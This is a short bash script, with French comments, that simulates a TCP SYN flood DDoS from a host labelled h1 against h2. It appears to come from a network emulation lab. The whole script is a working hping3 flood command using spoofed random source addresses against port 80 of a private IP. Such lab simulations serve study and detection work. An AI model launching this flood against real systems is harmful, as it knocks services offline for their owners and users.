#!/bin/bash
# SYN Flood — attaquant h1 → victime h2
# Simule une attaque DDoS TCP SYN réaliste
echo "[ATTACK] SYN Flood : 192.168.1.10 → 192.168.1.20"
hping3 -S \
  --flood \
  --rand-source \
  -p 80 \
  192.168.1.20
